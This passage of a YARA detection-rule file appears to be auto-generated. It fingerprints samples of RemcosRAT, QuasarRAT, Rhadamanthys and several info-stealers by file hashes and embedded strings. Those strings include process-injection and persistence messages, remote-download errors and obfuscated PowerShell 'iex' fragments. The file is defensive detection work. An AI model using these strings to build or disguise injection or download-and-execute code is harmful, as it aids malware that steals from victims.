      $s3 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s4 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s5 = "chartroom.exe" fullword wide /* score: '22.00'*/
      $s6 = "^bExROXon" fullword ascii /* base64 encoded string 'lLQ9z'' */ /* score: '14.00'*/
      $s7 = "nstall System v3.09</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s8 = "~nsu%X.tmp" fullword ascii /* score: '11.00'*/
      $s9 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s10 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s11 = "bonbonens" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__ea4e67a31ace1a72683a99b80cf37830_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_ea4e67a31ace1a72683a99b80cf37830(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5291ecc87ba8dbac74ac3b91f73ceba36b35d6b11455545e4e365859e45d8e5a"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s4 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s5 = "nstall System v3.06.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s6 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
      $s7 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__5ae8da8d195503ea36a6c31c6043ecb8_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5ae8da8d195503ea36a6c31c6043ecb8(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0c8a5acf9660b3ed12ec8b7cb2ed277f20a37bd6b06ab0f6074f80c4d69d74e1"
   strings:
      $s1 = "XXYXYYY" fullword ascii /* reversed goodware string 'YYYXYXX' */ /* score: '16.50'*/
      $s2 = "YYXZYZXZY" fullword ascii /* base64 encoded string 'avXevX' */ /* score: '16.50'*/
      $s3 = "XYYYYY" fullword ascii /* reversed goodware string 'YYYYYX' */ /* score: '16.50'*/
      $s4 = "PHP Command Line Interpreter" fullword wide /* score: '14.00'*/
      $s5 = "ZZZXXX" fullword ascii /* reversed goodware string 'XXXZZZ' */ /* score: '13.50'*/
      $s6 = "YZZZZZ" fullword ascii /* reversed goodware string 'ZZZZZY' */ /* score: '13.50'*/
      $s7 = "XYZZZY" fullword ascii /* reversed goodware string 'YZZZYX' */ /* score: '13.50'*/
      $s8 = "XZYXXX" fullword ascii /* reversed goodware string 'XXXYZX' */ /* score: '13.50'*/
      $s9 = "* YYYYYX" fullword ascii /* score: '12.00'*/
      $s10 = "ZYYYYXZYZZ" fullword ascii /* score: '9.50'*/
      $s11 = "QYYYYZZ" fullword ascii /* score: '9.50'*/
      $s12 = "ZZYYYYZ" fullword ascii /* score: '9.50'*/
      $s13 = "ZXYYYYYY" fullword ascii /* score: '9.50'*/
      $s14 = "ZYYYYXZ" fullword ascii /* score: '9.50'*/
      $s15 = "ApsQ -k" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 21000KB and
      8 of them
}

rule QuasarRAT_signature__f52a2ec780c5256967378af46472f651_imphash_ {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_f52a2ec780c5256967378af46472f651(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5df7a18c5674abbab89a53d3398c3398b800b14f8ff08488d89407402325f75a"
   strings:
      $x1 = "Failed to open process: explorer.exe" fullword ascii /* score: '33.00'*/
      $x2 = "[-] Failed to get handle to ntdll.dll" fullword ascii /* score: '32.00'*/
      $s3 = "Failed to load combase.dll" fullword ascii /* score: '26.00'*/
      $s4 = "Opening target process" fullword ascii /* score: '25.00'*/
      $s5 = "Thread started succesfully started on target process, stopping" fullword ascii /* score: '25.00'*/
      $s6 = "[-] Failed to get NtCreateThreadEx address" fullword ascii /* score: '22.00'*/
      $s7 = "[EXT] failed to download extension from remote host" fullword ascii /* score: '21.00'*/
      $s8 = "Starting RAT injection" fullword ascii /* score: '19.00'*/
      $s9 = "Attempting to make the process persistent..." fullword ascii /* score: '17.00'*/
      $s10 = "Could not create process" fullword ascii /* score: '15.00'*/
      $s11 = "QueryInterface call failed for IExecAction" fullword ascii /* score: '15.00'*/
      $s12 = "Failed to download extension from server." fullword ascii /* score: '13.00'*/
      $s13 = "^((http|https|ftp):\\/\\/)?(([a-zA-Z0-9\\-\\.]+)\\.([a-zA-Z]{2,3}))(:\\d+)?(\\/\\S*)?$" fullword ascii /* score: '12.00'*/
      $s14 = "Failed to deobfuscate payload" fullword ascii /* score: '12.00'*/
      $s15 = "attempting to parse an empty input; check that your input string or stream contains the expected JSON" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__442cd635b0ae873bc92537f6f6554791_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_442cd635b0ae873bc92537f6f6554791(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "415b94605e8ea36e31cf5efbb6262f65d375eec545e67cc1776cde3744a8cf5b"
   strings:
      $s1 = "\"Entrust Timestamp Authority - TSA10" fullword ascii /* score: '15.00'*/
      $s2 = "\"Entrust Timestamp Authority - TSA1" fullword ascii /* score: '15.00'*/
      $s3 = "shell32 (SHGetKnownFolderPath/SHBrowseForFolder/IShellLink)," fullword wide /* score: '14.00'*/
      $s4 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s5 = "Operations complete." fullword wide /* score: '12.00'*/
      $s6 = "advapi32 (registry), and comctl32 (TaskDialog/InitCommonControls)." fullword wide /* score: '12.00'*/
      $s7 = "            <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s8 = "%s\\Exing.txt" fullword wide /* score: '11.00'*/
      $s9 = "%s\\Exing Shortcut.lnk" fullword wide /* score: '11.00'*/
      $s10 = "    processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s11 = "'http://aia.entrust.net/ts1-chain256.cer01" fullword ascii /* score: '10.00'*/
      $s12 = "https://www.entrust.net/rpa0" fullword ascii /* score: '10.00'*/
      $s13 = "<read failed>" fullword wide /* score: '10.00'*/
      $s14 = "It exercises kernel32 (CreateFile/WriteFile)," fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule Rhadamanthys_signature__442cd635b0ae873bc92537f6f6554791_imphash__bd322aca {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_442cd635b0ae873bc92537f6f6554791(imphash)_bd322aca.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bd322aca125d095bb81195df86f43772187bc4f5133ff8f78c84c7ee11a9b8d1"
   strings:
      $s1 = "shell32 (SHGetKnownFolderPath/SHBrowseForFolder/IShellLink)," fullword wide /* score: '14.00'*/
      $s2 = "Operations complete." fullword wide /* score: '12.00'*/
      $s3 = "advapi32 (registry), and comctl32 (TaskDialog/InitCommonControls)." fullword wide /* score: '12.00'*/
      $s4 = "            <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s5 = "%s\\Exing.txt" fullword wide /* score: '11.00'*/
      $s6 = "%s\\Exing Shortcut.lnk" fullword wide /* score: '11.00'*/
      $s7 = "    processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s8 = "<read failed>" fullword wide /* score: '10.00'*/
      $s9 = "It exercises kernel32 (CreateFile/WriteFile)," fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule Rhadamanthys_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fce0a8d71789f5cbb4f08e9cafd5dcf61c33ddadaaf594b33bb849e035101062"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v1.34.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "* lSw)" fullword ascii /* score: '9.00'*/
      $s6 = "** $s4" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__442cd635b0ae873bc92537f6f6554791_imphash__26becf75 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_442cd635b0ae873bc92537f6f6554791(imphash)_26becf75.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "26becf75852e652cca5e930d666facc9188e21ec7926c38babf1348164136246"
   strings:
      $s1 = "shell32 (SHGetKnownFolderPath/SHBrowseForFolder/IShellLink)," fullword wide /* score: '14.00'*/
      $s2 = "Operations complete." fullword wide /* score: '12.00'*/
      $s3 = "advapi32 (registry), and comctl32 (TaskDialog/InitCommonControls)." fullword wide /* score: '12.00'*/
      $s4 = "%s\\Exing.txt" fullword wide /* score: '11.00'*/
      $s5 = "%s\\Exing Shortcut.lnk" fullword wide /* score: '11.00'*/
      $s6 = "<read failed>" fullword wide /* score: '10.00'*/
      $s7 = "It exercises kernel32 (CreateFile/WriteFile)," fullword wide /* score: '9.00'*/
      $s8 = "* mqS O" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule PureLogsStealer_signature__941a3b2713c7a12223a7696c8685d4d8_imphash_ {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_941a3b2713c7a12223a7696c8685d4d8(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dfae3c8310231b314c6193d12274ef285de473ada117e66fa7fa1c7e298bd712"
   strings:
      $x1 = "bcryptprimitives.dll" fullword ascii /* reversed goodware string 'lld.sevitimirptpyrcb' */ /* score: '33.00'*/
      $s2 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '27.00'*/
      $s3 = "NotFoundPermissionDeniedConnectionRefusedConnectionResetHostUnreachableNetworkUnreachableConnectionAbortedNotConnectedAddrInUseA" ascii /* score: '27.00'*/
      $s4 = "assertion failed: injected && !worker_thread.is_null()7RBMW26BEVC4SW7COAOLFVU94L3GQAPHAT5AJ6J5index.crates.io-1949cf8c6b5b557f" ascii /* score: '23.00'*/
      $s5 = "assertion failed: injected && !worker_thread.is_null()7RBMW26BEVC4SW7COAOLFVU94L3GQAPHAT5AJ6J5index.crates.io-1949cf8c6b5b557f" ascii /* score: '23.00'*/
      $s6 = "ectedaddress in useaddress not availablenetwork downbroken pipeentity already existsoperation would blocknot a directoryis a dir" ascii /* score: '20.00'*/
      $s7 = "&IZSTYJ4FCNVGGLZVKGEZZFMUGDPQJ4B9Z2IVQ251LY87B3952QJHFFGQZ4YNK5PV3373GB8X17PQYOX1'i'+''+''+'ex'2Y7UWDLWQLPIA4C6SAJTLEWYM9WNTVXF9" ascii /* score: '20.00'*/
      $s8 = "the number of hardware threads is not known for the target platform" fullword ascii /* score: '19.00'*/
      $s9 = "ZORNW3DC5GETEJRAG204ITLD [sySteM.IO.cOMpReSSiON.coMpResSioNMode]::IZSTYJ4FCNVGGLZVKGEZZFMUGDPQJ4B9Z2IVQ251LY87B3952QJHFFGQZ4YNK5" ascii /* score: '19.00'*/
      $s10 = "fatal runtime error: I/O error: operation failed to complete synchronously, aborting" fullword ascii /* score: '18.00'*/
      $s11 = ",failed to spawn thread3LC1JA/29483883eed69d5fb4db01964cdf2af4d86e9cb2\\0CD0456Zstd8K68Gthread\\modBWF" fullword ascii /* score: '18.00'*/
      $s12 = "PoisonError" fullword ascii /* score: '17.00'*/
      $s13 = "ddrNotAvailableNetworkDownBrokenPipeAlreadyExistsNotADirectoryIsADirectoryDirectoryNotEmptyReadOnlyFilesystemFilesystemLoopStale" ascii /* score: '17.00'*/
      $s14 = "NetworkFileHandleInvalidInputInvalidDataTimedOutWriteZeroStorageFullNotSeekableQuotaExceededFileTooLargeResourceBusyExecutableFi" ascii /* score: '16.00'*/
      $s15 = "3LC1JA/29483883eed69d5fb4db01964cdf2af4d86e9cb2\\0CD0456Zstd8K68Gsync\\poison\\onceBWF" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule PureLogsStealer_signature__941a3b2713c7a12223a7696c8685d4d8_imphash__1d1e4a08 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_941a3b2713c7a12223a7696c8685d4d8(imphash)_1d1e4a08.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d1e4a085bca8408c68e3b717f77cb667bcc0192502ecd2094a87f868aabb93a"
   strings:
      $x1 = "bcryptprimitives.dll" fullword ascii /* reversed goodware string 'lld.sevitimirptpyrcb' */ /* score: '33.00'*/
      $s2 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '27.00'*/
      $s3 = "NotFoundPermissionDeniedConnectionRefusedConnectionResetHostUnreachableNetworkUnreachableConnectionAbortedNotConnectedAddrInUseA" ascii /* score: '27.00'*/
      $s4 = "assertion failed: injected && !worker_thread.is_null()PNMILIOU7VTP59R4K52L47P1L23FYT6FWRL7KDOIindex.crates.io-1949cf8c6b5b557f" ascii /* score: '23.00'*/
      $s5 = "assertion failed: injected && !worker_thread.is_null()PNMILIOU7VTP59R4K52L47P1L23FYT6FWRL7KDOIindex.crates.io-1949cf8c6b5b557f" ascii /* score: '23.00'*/
      $s6 = "SystemPNMILIOU7VTP59R4K52L47P1L23FYT6FWRL7KDOIindex.crates.io-1949cf8c6b5b557f\\sysinfo-0.33.1T4UL1windows\\processADM" fullword ascii /* score: '22.00'*/
      $s7 = "ectedaddress in useaddress not availablenetwork downbroken pipeentity already existsoperation would blocknot a directoryis a dir" ascii /* score: '20.00'*/
      $s8 = "&HGXQ7SJMEQMDWLKLP86N6Z5Y7S72SQQ4YU79971TFU5JTV97NM9ON4X8X2669VDXOQ3PN1XYSUM89KVX'i'+''+''+'ex'L7K9JOZ39GQ51OZN84GVY5EU3W2TP2C27" ascii /* score: '20.00'*/
      $s9 = "the number of hardware threads is not known for the target platform" fullword ascii /* score: '19.00'*/
      $s10 = "fatal runtime error: I/O error: operation failed to complete synchronously, aborting" fullword ascii /* score: '18.00'*/
      $s11 = "failed to spawn threadYB4RO8/29483883eed69d5fb4db01964cdf2af4d86e9cb2\\BQTX9S8ZstdT4UL1thread\\modADM" fullword ascii /* score: '18.00'*/
      $s12 = "PoisonError" fullword ascii /* score: '17.00'*/
      $s13 = "ddrNotAvailableNetworkDownBrokenPipeAlreadyExistsNotADirectoryIsADirectoryDirectoryNotEmptyReadOnlyFilesystemFilesystemLoopStale" ascii /* score: '17.00'*/
      $s14 = "NetworkFileHandleInvalidInputInvalidDataTimedOutWriteZeroStorageFullNotSeekableQuotaExceededFileTooLargeResourceBusyExecutableFi" ascii /* score: '16.00'*/
      $s15 = "\\Processor(_Total)\\% Idle Timetot_0\\Processor()\\% Idle Time" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule RustyStealer_signature__a073caaf3f76599c419db785a4a960e6_imphash_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_a073caaf3f76599c419db785a4a960e6(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3838297c3967860e650e074164bf84b7fdd8c06e6bd63831b31c0a9bd6e46a1e"
   strings:
      $x1 = "Overflow when calculating decoded lengthC:\\Users\\sola\\.cargo\\registry\\src\\rsproxy.cn-0dccff568467c15b\\base64-0.20.0\\src" ascii /* score: '37.00'*/
      $x2 = "assertion failed: injected && !worker_thread.is_null()C:\\Users\\sola\\.cargo\\registry\\src\\rsproxy.cn-0dccff568467c15b\\rayon" ascii /* score: '36.00'*/
      $x3 = "assertion failed: injected && !worker_thread.is_null()C:\\Users\\sola\\.cargo\\registry\\src\\rsproxy.cn-0dccff568467c15b\\rayon" ascii /* score: '36.00'*/
      $x4 = "crypt1fN!pwM`1R&2tTr)pJ>yh(Q@eZWIFA+=Vn};Bvr+YAl!5lLOpR~NwXK;Y5mo!!|TQ3kYE1YqsBa8%-m&H%a-sHDI$jSJ&qGLW&nOpBhRTh+TWBiooUr7Uj!<OoV" ascii /* score: '35.50'*/
      $x5 = "Overflow when calculating decoded lengthC:\\Users\\sola\\.cargo\\registry\\src\\rsproxy.cn-0dccff568467c15b\\base64-0.20.0\\src" ascii /* score: '34.00'*/
      $x6 = "decoded length calculation overflowC:\\Users\\sola\\.cargo\\registry\\src\\rsproxy.cn-0dccff568467c15b\\base64-0.20.0\\src\\deco" ascii /* score: '34.00'*/
      $x7 = "library\\std\\src\\sys\\windows\\args.rscmd.exe /d /c \"Windows file names may not contain `\"` or end with `\\`" fullword ascii /* score: '31.00'*/
      $x8 = "assertion failed: mid <= self.len()assertion failed: vec.capacity() - start >= lenC:\\Users\\sola\\.cargo\\registry\\src\\rsprox" ascii /* score: '31.00'*/
      $x9 = "assertion failed: mid <= self.len()assertion failed: vec.capacity() - start >= lenC:\\Users\\sola\\.cargo\\registry\\src\\rsprox" ascii /* score: '31.00'*/
      $s10 = "PoisonErrorC:\\Users\\sola\\.cargo\\registry\\src\\rsproxy.cn-0dccff568467c15b\\rayon-core-1.12.1\\src\\latch.rs" fullword ascii /* score: '30.00'*/
      $s11 = "ntdll.dllC:\\Windows\\System32\\ntdll.dll0xf" fullword ascii /* score: '30.00'*/
      $s12 = "exe\\\\.\\NUL\\cmd.exemaximum number of ProcThreadAttributes exceeded" fullword ascii /* score: '30.00'*/
      $s13 = "C:\\Users\\sola\\.cargo\\registry\\src\\rsproxy.cn-0dccff568467c15b\\winproc-0.6.4\\src\\process\\module.rs" fullword ascii /* score: '29.00'*/
      $s14 = "C:\\Users\\sola\\.cargo\\registry\\src\\rsproxy.cn-0dccff568467c15b\\winproc-0.6.4\\src\\process\\mod.rs" fullword ascii /* score: '29.00'*/
      $s15 = "C:\\Users\\sola\\.cargo\\registry\\src\\rsproxy.cn-0dccff568467c15b\\base64-0.20.0\\src\\engine\\fast_portable\\decode_suffix.rs" ascii /* score: '28.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__1deeab33a3db0d2c20caa9f7afb33436_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1deeab33a3db0d2c20caa9f7afb33436(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "64806bea9c63c64f65ff89841a083547dca73ce0f888d083c6c1c74670428773"
   strings:
      $s1 = "CryptGetHashParam" fullword wide /* score: '12.00'*/
      $s2 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s3 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s4 = "CoCreateInstance(ShellLink)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Rhadamanthys_signature__d6a94b849b61f38a50afae24c5fb0abf_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_d6a94b849b61f38a50afae24c5fb0abf(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9fa816137ebc8147afb914999724d61d979c56b2fb5680a8f38f36a2e173174d"
   strings:
      $s1 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s2 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Rhadamanthys_signature__d6a94b849b61f38a50afae24c5fb0abf_imphash__3468787c {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_d6a94b849b61f38a50afae24c5fb0abf(imphash)_3468787c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3468787c2b14e1b6bda417f513631c11a49b11914b822c449b80b00c560108b0"
   strings:
      $s1 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s2 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Rhadamanthys_signature__d6a94b849b61f38a50afae24c5fb0abf_imphash__99f9692c {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_d6a94b849b61f38a50afae24c5fb0abf(imphash)_99f9692c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "99f9692c01489daaec146807f05e426b9dd73be2d880fb0a1648c0e990aaeb15"
   strings:
      $s1 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s2 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Rhadamanthys_signature__32f3282581436269b3a75b6675fe3e08_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_32f3282581436269b3a75b6675fe3e08(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "14b91ed2158b2f711a8c75fa12a5a53552e7920c534fafd413df9d79ed91d2ac"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v3.95.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "]bHSGS:\\" fullword ascii /* score: '10.00'*/
      $s6 = "/^[5>=/>0" fullword ascii /* score: '9.00'*/ /* hex encoded string 'P' */
      $s7 = "6e4\\`{_6" fullword ascii /* score: '9.00'*/ /* hex encoded string 'nF' */
      $s8 = "4f [+7c\"" fullword ascii /* score: '9.00'*/ /* hex encoded string 'O|' */
      $s9 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s10 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s11 = "hAUi!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__b87a0833 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_b87a0833.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b87a083343939a8260bb395af58b09dd699f8a4525aa8f6786210c3b1c691653"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v9.16.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "FaWc:\"" fullword ascii /* score: '10.00'*/
      $s6 = "xpasvgg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule PhantomStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file PhantomStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "982ea5afdf3816256c473b9df8136c96894ec8e1037ab02fdeb55caf65bbf3ce"
   strings:
      $s1 = "C:\\Users\\User\\Documents" fullword ascii /* score: '24.00'*/
      $s2 = "seRc.exe" fullword wide /* score: '22.00'*/
      $s3 = "comparison_report_{0:yyyyMMdd_HHmmss}.txt" fullword wide /* score: '20.00'*/
      $s4 = "SSH, Telnet and Rlogin client" fullword ascii /* score: '15.00'*/
      $s5 = "<ProcessorCount>k__BackingField" fullword ascii /* score: '15.00'*/
      $s6 = "set_ProcessorCount" fullword ascii /* score: '15.00'*/
      $s7 = "Baseline [{0:yyyy-MM-dd HH:mm:ss}] - CPU: {1:F1}%, Memory: {2:F1}%, Disk: {3:F1}%, Network: {4:F1} Mbps" fullword wide /* score: '15.00'*/
      $s8 = "Processors: {0}" fullword wide /* score: '15.00'*/
      $s9 = "Win32_Processor.DeviceID='CPU0'" fullword wide /* score: '15.00'*/
      $s10 = "SELECT Name, MaxClockSpeed FROM Win32_Processor" fullword wide /* score: '15.00'*/
      $s11 = "Comparison Results (Baseline 2 - Baseline 1)" fullword wide /* score: '15.00'*/
      $s12 = "GetNetworkUsage" fullword ascii /* score: '14.00'*/
      $s13 = "seRc.pdb" fullword ascii /* score: '14.00'*/
      $s14 = "<GetDiskUsageAlternative>b__14_0" fullword ascii /* score: '14.00'*/
      $s15 = "GetMemoryUsageAlternative" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule Rhadamanthys_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "98876a629b573dd854ae906de46da1841a358f06b53140e7f898fbc2820098e6"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD\"" fullword ascii /* score: '27.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADP" fullword ascii /* score: '27.00'*/
      $s3 = "EasyTune.exe" fullword wide /* score: '22.00'*/
      $s4 = "DEBUG: ERRORE - Nessun campo usage nella risposta API" fullword wide /* score: '21.00'*/
      $s5 = "Enzamlare.GptClassificatoreTransazioni+VB$StateMachine_22_ChiamaGptApi, Gf6yo0x, Version=8.0.2.20, Culture=neutral, PublicKeyTok" ascii /* score: '20.00'*/
      $s6 = "Enzamlare.GptClassificatoreTransazioni+VB$StateMachine_9_TrovaPatternSimiliAvanzato, Gf6yo0x, Version=8.0.2.20, Culture=neutral," ascii /* score: '20.00'*/
